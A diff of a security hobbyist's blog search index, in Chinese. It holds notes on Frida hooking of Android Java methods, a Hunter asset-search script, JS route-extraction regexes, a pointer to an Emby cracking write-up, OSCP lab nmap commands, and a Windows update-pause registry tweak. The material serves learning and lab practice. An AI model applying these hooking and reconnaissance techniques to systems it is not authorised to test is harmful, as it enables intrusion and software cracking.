@@ -299,6 +299,24 @@
       </tags>
   </entry>
   <entry>
+    <title>Windows注册表防更新</title>
+    <url>/2024/12/30/Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%98%B2%E6%9B%B4%E6%96%B0/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:0000F423F</span><br><span class="line">&quot;PauseFeatureUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseFeatureUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseUpdatesExpiryTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>直接去注册表如下位置添加DWORD(32位)值(D)，值自己设，进制改为10按道理也行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:00002710</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>Windows update</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Nacos系统漏洞</title>
     <url>/2026/01/13/Nacos%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="1前言"><a href="#1前言" class="headerlink" title="1前言"></a>1前言</h1><p>知道泄露接口以及危险接口大致如下：</p>
@@ -400,24 +418,6 @@
       </categories>
       <tags>
         <tag>app-test</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows注册表防更新</title>
-    <url>/2024/12/30/Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%98%B2%E6%9B%B4%E6%96%B0/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:0000F423F</span><br><span class="line">&quot;PauseFeatureUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseFeatureUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseUpdatesExpiryTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<p>直接去注册表如下位置添加DWORD(32位)值(D)，值自己设，进制改为10按道理也行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:00002710</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>Windows update</tag>
       </tags>
   </entry>
   <entry>
@@ -603,6 +603,46 @@
       </tags>
   </entry>
   <entry>
+    <title>frida的学习</title>
+    <url>/2026/02/08/frida%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>之前用<code>frida</code>只晓得使用已经构建好的<code>js</code>，还是系统的学习一下比较好，遇到一些自定义的类也可以自己解决</p>
+<p><a href="https://www.bilibili.com/video/BV1ZT421k7xw/">2024最新版Frida逆向与抓包实战教程，一周学完帮你少走99%弯路！【Python入门&#x2F;Frida逆向&#x2F;Hook入门&#x2F;APP抓包】_哔哩哔哩_bilibili</a></p>
+<span id="more"></span>
+
+<p>工具：frida+jadx&#x2F;</p>
+<h1 id="1-Java层hook"><a href="#1-Java层hook" class="headerlink" title="1-Java层hook"></a>1-Java层hook</h1><p><code>js</code>是弱参数类型，<code>java</code>是强参数类型，注意转换</p>
+<h2 id="普通方法"><a href="#普通方法" class="headerlink" title="普通方法"></a>普通方法</h2><h3 id="1-常规hook："><a href="#1-常规hook：" class="headerlink" title="1&gt;常规hook："></a>1&gt;常规hook：</h3><p><code>var</code> 类名 &#x3D; <code>java.use</code>(包名.类名);</p>
+<p><strong>类名.方法名.implementation &#x3D; 具体function函数</strong></p>
+<h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#特征--构造方法</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">xxx</span>();</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-常规hook更改-init："><a href="#1-常规hook更改-init：" class="headerlink" title="1&gt;常规hook更改$init："></a>1&gt;常规hook更改<code>$init</code>：</h3><p><code>var</code> 类名 &#x3D; <code>java.use</code>(包名.类名);</p>
+<p><strong>类名.<code>$init</code>.implementation &#x3D; 具体function函数</strong></p>
+<h2 id="重载方法"><a href="#重载方法" class="headerlink" title="重载方法"></a>重载方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#特征--多个相同方法不同传入参数类型</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">test</span><span class="params">()</span>&#123;xxx&#125;;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">test</span><span class="params">(<span class="type">int</span> num)</span>&#123;xxx&#125;;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">test</span><span class="params">(String num)</span>&#123;xxx&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-常规hook-overload-："><a href="#1-常规hook-overload-：" class="headerlink" title="1&gt;常规hook+overload()："></a>1&gt;常规hook+<code>overload()</code>：</h3><p><code>var</code> 类名 &#x3D; <code>java.use</code>(包名.类名);</p>
+<p><strong>类名.方法名.<code>overload(&quot;int&quot;)</code>.implementation &#x3D; 具体function函数</strong></p>
+<h4 id="注意String为java系统类"><a href="#注意String为java系统类" class="headerlink" title="注意String为java系统类"></a>注意<code>String</code>为<code>java</code>系统类</h4><p><code>String</code>是单独一个在<code>lang</code>包里面的类，可以在<code>jre</code>里面的<code>lib</code>的<code>rt.jar</code>压包里面找到<code>String.class</code>，示例：<br><strong>类名.方法名.<code>overload(&quot;java.lang.String&quot;)</code>.implementation &#x3D; 具体function函数</strong></p>
+<h3 id="2-传入对象参数"><a href="#2-传入对象参数" class="headerlink" title="2&gt;传入对象参数"></a>2&gt;传入对象参数</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#传参为自定义的对象</span><br><span class="line">类名<span class="number">1.</span>test(<span class="keyword">new</span> 对象(<span class="string">&quot;xx&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<h4 id="重载hook-类路径"><a href="#重载hook-类路径" class="headerlink" title="#重载hook+类路径"></a>#重载hook+类路径</h4><p><strong>类名.方法名.<code>overload(&quot;java.lang.String&quot;)</code>.implementation &#x3D; 具体function函数</strong></p>
+<h4 id="更改入参"><a href="#更改入参" class="headerlink" title="更改入参"></a>更改入参</h4><h5 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">send()比console.log输出多，可以直接输出object的结构</span><br><span class="line">console.log输出稳定，就算输出不了也给你输出一点属性类型</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> 类名<span class="number">1</span> = java.use(<span class="string">&#x27;com.xxx.xxx.类名&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> 对象<span class="number">1</span> = java.use(<span class="string">&#x27;com.xxx.xxx.对象&#x27;</span>);</span><br><span class="line">类名<span class="number">1.</span>方法名.overload(<span class="string">&quot;com.xxx.xxx.对象&quot;</span>).implementation = function(obj)&#123;</span><br><span class="line">	#展示</span><br><span class="line">	send(obj.get());</span><br><span class="line">    #实例化对象</span><br><span class="line">    <span class="type">var</span> <span class="variable">test</span> <span class="operator">=</span> 对象<span class="number">1.</span>$<span class="keyword">new</span>(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line">    send(test.get());</span><br><span class="line">    <span class="keyword">return</span> 本身的类型</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="更改属性"><a href="#更改属性" class="headerlink" title="更改属性"></a>更改属性</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">send</span>(实例化对象test.<span class="property">name</span>);</span><br><span class="line">#返回的是objec的json结构</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(实例化对象test.<span class="property">name</span>);</span><br><span class="line">#返回的是object</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(实例化对象test.<span class="property">name</span>.<span class="property">value</span>);</span><br><span class="line">#返回的是值</span><br><span class="line">#直接赋值</span><br><span class="line">object.<span class="property">name</span>.<span class="property">value</span>=<span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">#更改为字符</span><br></pre></td></tr></table></figure>
+
+<h5 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h5><p><code>可以反射给其他语言例如C++来操作</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#类的构造器</span><br><span class="line">var clazz = Java.use(&#x27;java.lang.Class&#x27;);</span><br><span class="line">类名1.方法名.overload(&quot;com.xxx.xxx.对象&quot;).implementation = function(obj)&#123;</span><br><span class="line">	#利用java.cast得到类id</span><br><span class="line">	#getDeclaredField(&#x27;num&#x27;);得到字段id</span><br><span class="line">	var 类的id==&gt;test1 = Java.cast(对象.getClass(),clazz).getDeclaredField(&#x27;num&#x27;);</span><br><span class="line">	#参数设置，为可更改</span><br><span class="line">	test1.setAccessible(true);</span><br><span class="line">	var value = test1.get(实例化对象test);</span><br><span class="line">	console.log(value);</span><br><span class="line">	#更改属性类型的值</span><br><span class="line">	test1.setInt(实例化对象test,更改的int类型的值);</span><br><span class="line">	return this.test(实例化对象test);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>Notes</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>emby逆向记录</title>
     <url>/2025/06/24/emby%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/</url>
     <content><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1-前言"></a>1-前言</h1><p>参考文章<a href="https://www.52pojie.cn/thread-1847431-1-1.html">破解Emby Server&#x2F;Client For iOS&#x2F;MacOS&#x2F;Linux&#x2F;Android 通杀方案 - 吾爱破解 - 52pojie.cn</a></p>
@@ -613,6 +653,74 @@
       </categories>
       <tags>
         <tag>article</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hunter批量搜索</title>
+    <url>/2025/05/09/hunter%E8%AF%AD%E6%B3%95%E6%89%B9%E9%87%8F%E6%90%9C%E7%B4%A2/</url>
+    <content><![CDATA[<h1 id="述"><a href="#述" class="headerlink" title="述"></a>述</h1><p>工作的时候，要求要找不同地方的同一性质的资产，为了避免麻烦，所以干脆找ai写了一个脚本，感觉蛮好用的，想着以后若是更新或者增加功能点，方便回想功能的构造，所用api为hunter，在此记录如下</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>全组合-笛卡尔积</p>
+<table>
+<thead>
+<tr>
+<th>all-body</th>
+<th>domain</th>
+<th>all-title</th>
+<th>|body</th>
+<th>title!</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>河南</td>
+<td>pay</td>
+<td>读书</td>
+<td>a</td>
+<td>湖北</td>
+</tr>
+<tr>
+<td>郑州</td>
+<td>go</td>
+<td>支付</td>
+<td>b</td>
+<td></td>
+</tr>
+<tr>
+<td>开封</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<span id="more"></span>
+
+<p>all-“标题”一行会与”标题”一列全组合</p>
+<p>!代表减去标题；如：web.title!&#x3D;””</p>
+<p>|代表括号中的或语句；如：(web.title&#x3D;”” || web.title&#x3D;””)</p>
+<p>上方查询语句如下</p>
+<ol>
+<li>组合1**<br><code>body=&quot;河南&quot; &amp;&amp; title=&quot;读书&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;)</code> &amp;&amp; title !&#x3D; “湖北”<br>（<code>all-body</code>取”河南” + <code>all-title</code>取”读书” + 普通列<code>domain</code>取”pay”和”go” + OR列<code>body</code>取”a”或”b” + !取”湖北”）</li>
+<li><strong>组合2</strong><br><code>body=&quot;河南&quot; &amp;&amp; title=&quot;支付&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code><br>（<code>all-body</code>取”河南” + <code>all-title</code>取”支付” + 其他条件同上）</li>
+<li><strong>组合3</strong><br><code>body=&quot;郑州&quot; &amp;&amp; title=&quot;读书&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
+<li><strong>组合4</strong><br><code>body=&quot;郑州&quot; &amp;&amp; title=&quot;支付&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
+<li><strong>组合5</strong><br><code>body=&quot;开封&quot; &amp;&amp; title=&quot;读书&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
+<li><strong>组合6</strong><br><code>body=&quot;开封&quot; &amp;&amp; title=&quot;支付&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
+</ol>
+<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p>“””生成所有搜索组合”””</p>
+<p>“””构造搜索查询语句并编码”””</p>
+<p>“””发送API请求”””</p>
+<p>“””处理API返回结果”””</p>
+<p>“””保存为Excel文件”””</p>
+<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><p>延迟访问，避免请求过快</p>
+<p>查询中的反斜杠错误</p>
+<p>处理json考虑返回none</p>
+<p><a href="https://github.com/cliayn/hunter_batch-Surveying">https://github.com/cliayn/hunter_batch-Surveying</a></p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>project</tag>
       </tags>
   </entry>
   <entry>
@@ -788,65 +896,17 @@
       </tags>
   </entry>
   <entry>
-    <title>hunter批量搜索</title>
-    <url>/2025/05/09/hunter%E8%AF%AD%E6%B3%95%E6%89%B9%E9%87%8F%E6%90%9C%E7%B4%A2/</url>
-    <content><![CDATA[<h1 id="述"><a href="#述" class="headerlink" title="述"></a>述</h1><p>工作的时候，要求要找不同地方的同一性质的资产，为了避免麻烦，所以干脆找ai写了一个脚本，感觉蛮好用的，想着以后若是更新或者增加功能点，方便回想功能的构造，所用api为hunter，在此记录如下</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>全组合-笛卡尔积</p>
-<table>
-<thead>
-<tr>
-<th>all-body</th>
-<th>domain</th>
-<th>all-title</th>
-<th>|body</th>
-<th>title!</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>河南</td>
-<td>pay</td>
-<td>读书</td>
-<td>a</td>
-<td>湖北</td>
-</tr>
-<tr>
-<td>郑州</td>
-<td>go</td>
-<td>支付</td>
-<td>b</td>
-<td></td>
-</tr>
-<tr>
-<td>开封</td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
+    <title>js排查pages和api</title>
+    <url>/2025/05/30/js%E6%8E%92%E6%9F%A5pages%E5%92%8Capi/</url>
+    <content><![CDATA[<h1 id="述"><a href="#述" class="headerlink" title="述"></a>述</h1><p>注：这个只是为了学习原理，更好的工具推荐是F6JO大佬的bp插件<a href="https://github.com/F6JO/JsRouteScan">JsRouteScan</a></p>
+<p>或者自己访问所有链接把所有js保存到同一目录，再用正则表达式提取比较全面</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>通过伪造请求头，遍历所有的src跳转链接，保存所有响应为200的js放在同一目录下，用脚本遍历js，过滤出正则表达式对应的前端目录，拼接目录进行如上循环，直到连续两次路径集合相同或达到最大迭代次数，最后对js目录提取规定的正则表达式</p>
 <span id="more"></span>
 
-<p>all-“标题”一行会与”标题”一列全组合</p>
-<p>!代表减去标题；如：web.title!&#x3D;””</p>
-<p>|代表括号中的或语句；如：(web.title&#x3D;”” || web.title&#x3D;””)</p>
-<p>上方查询语句如下</p>
-<ol>
-<li>组合1**<br><code>body=&quot;河南&quot; &amp;&amp; title=&quot;读书&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;)</code> &amp;&amp; title !&#x3D; “湖北”<br>（<code>all-body</code>取”河南” + <code>all-title</code>取”读书” + 普通列<code>domain</code>取”pay”和”go” + OR列<code>body</code>取”a”或”b” + !取”湖北”）</li>
-<li><strong>组合2</strong><br><code>body=&quot;河南&quot; &amp;&amp; title=&quot;支付&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code><br>（<code>all-body</code>取”河南” + <code>all-title</code>取”支付” + 其他条件同上）</li>
-<li><strong>组合3</strong><br><code>body=&quot;郑州&quot; &amp;&amp; title=&quot;读书&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
-<li><strong>组合4</strong><br><code>body=&quot;郑州&quot; &amp;&amp; title=&quot;支付&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
-<li><strong>组合5</strong><br><code>body=&quot;开封&quot; &amp;&amp; title=&quot;读书&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
-<li><strong>组合6</strong><br><code>body=&quot;开封&quot; &amp;&amp; title=&quot;支付&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
-</ol>
-<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p>“””生成所有搜索组合”””</p>
-<p>“””构造搜索查询语句并编码”””</p>
-<p>“””发送API请求”””</p>
-<p>“””处理API返回结果”””</p>
-<p>“””保存为Excel文件”””</p>
-<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><p>延迟访问，避免请求过快</p>
-<p>查询中的反斜杠错误</p>
-<p>处理json考虑返回none</p>
-<p><a href="https://github.com/cliayn/hunter_batch-Surveying">https://github.com/cliayn/hunter_batch-Surveying</a></p>
+<p>不足：</p>
+<p>仅仅对url的目录排查和哈希路由排查，后续能力提升可能会功能进行增强</p>
+<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pattern_groups = &#123;</span><br><span class="line">    <span class="string">&quot;PagePath Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;pagePath:\s*&quot;(.*?)&quot;&#x27;</span>), <span class="string">&quot;pagePath_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;pagePath:\s*&#x27;(.*?)&#x27;&quot;</span>), <span class="string">&quot;pagePath_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;Path Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;path:\s*&quot;(.*?)&quot;&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;path:\s*&#x27;(.*?)&#x27;&quot;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;url:\s*&quot;([^&quot;]+)&quot;&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;url: &quot;([^&quot;]+)&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;GET Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;get\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;</span>), <span class="string">&quot;get_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;get\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;</span>), <span class="string">&quot;get_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;POST Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;post\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;</span>), <span class="string">&quot;post_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;POST\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;</span>), <span class="string">&quot;post_double_quotes&quot;</span>),</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>Cybersecurity</category>
@@ -899,26 +959,6 @@
       </categories>
       <tags>
         <tag>article</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>js排查pages和api</title>
-    <url>/2025/05/30/js%E6%8E%92%E6%9F%A5pages%E5%92%8Capi/</url>
-    <content><![CDATA[<h1 id="述"><a href="#述" class="headerlink" title="述"></a>述</h1><p>注：这个只是为了学习原理，更好的工具推荐是F6JO大佬的bp插件<a href="https://github.com/F6JO/JsRouteScan">JsRouteScan</a></p>
-<p>或者自己访问所有链接把所有js保存到同一目录，再用正则表达式提取比较全面</p>
-<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>通过伪造请求头，遍历所有的src跳转链接，保存所有响应为200的js放在同一目录下，用脚本遍历js，过滤出正则表达式对应的前端目录，拼接目录进行如上循环，直到连续两次路径集合相同或达到最大迭代次数，最后对js目录提取规定的正则表达式</p>
-<span id="more"></span>
-
-<p>不足：</p>
-<p>仅仅对url的目录排查和哈希路由排查，后续能力提升可能会功能进行增强</p>
-<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pattern_groups = &#123;</span><br><span class="line">    <span class="string">&quot;PagePath Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;pagePath:\s*&quot;(.*?)&quot;&#x27;</span>), <span class="string">&quot;pagePath_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;pagePath:\s*&#x27;(.*?)&#x27;&quot;</span>), <span class="string">&quot;pagePath_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;Path Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;path:\s*&quot;(.*?)&quot;&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;path:\s*&#x27;(.*?)&#x27;&quot;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;url:\s*&quot;([^&quot;]+)&quot;&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;url: &quot;([^&quot;]+)&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;GET Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;get\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;</span>), <span class="string">&quot;get_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;get\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;</span>), <span class="string">&quot;get_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;POST Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;post\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;</span>), <span class="string">&quot;post_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;POST\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;</span>), <span class="string">&quot;post_double_quotes&quot;</span>),</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>project</tag>
       </tags>
   </entry>
   <entry>
@@ -1046,72 +1086,6 @@
       </categories>
       <tags>
         <tag>article</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>oscp靶场训练</title>
-    <url>/2025/08/25/oscp_attack-log/</url>
-    <content><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1-前言"></a>1-前言</h2><p>准备条件：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#kali系统</span><br><span class="line">kali-linux</span><br><span class="line"></span><br><span class="line">#必要的组件和更新	//运行exp</span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade -y</span><br><span class="line">sudo apt install -y build-essential git curl wget unzip vim tmux <span class="built_in">net</span>-tools htop</span><br><span class="line">sudo apt install -y python3 python3-pip python3-venv</span><br><span class="line">sudo apt install -y openjdk-<span class="number">17</span>-jdk</span><br><span class="line">sudo apt install -y libssl-dev</span><br><span class="line">sudo apt install -y netcat-traditional socat tcpdump wireshark</span><br><span class="line">sudo apt install -y nmap traceroute dnsutils</span><br><span class="line">sudo apt install -y exploitdb sqlmap john hydra metasploit-framework</span><br><span class="line">以及其他自定义的必要组件</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<h1 id="Kioptrix"><a href="#Kioptrix" class="headerlink" title="Kioptrix"></a>Kioptrix</h1><h3 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix Level 1"></a>Kioptrix Level 1</h3><p>—–<strong>简单的使用工具排查漏洞</strong>—–</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#快速扫描</span><br><span class="line">nmap -sn <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">#全端口扫描</span><br><span class="line">nmap -p <span class="number">1</span>-<span class="number">65535</span> -T4 -A -v <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span></span><br></pre></td></tr></table></figure>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/1.png" alt="扫描的tcp连接内容"></p>
